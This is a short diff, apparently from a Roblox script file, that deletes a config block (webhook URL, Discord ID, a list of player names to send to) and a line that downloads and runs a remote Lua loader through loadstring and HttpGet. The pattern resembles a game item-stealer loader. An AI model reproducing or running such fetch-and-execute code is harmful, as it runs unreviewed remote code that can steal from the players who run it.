@@ -1,6 +1,1 @@
-getgenv().CONFIG = {
-    WEBHOOK_URL = "",
-    DISCORD_ID = "",
-    PLAYERS_TO_SEND = {"JackOmegaQueen", "L3vi_Giga75", "Kaylee_Thunder16"}, --// Support Inf Players
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1354531fda84efe9ad75621f68e0b8a7.lua"))()
+
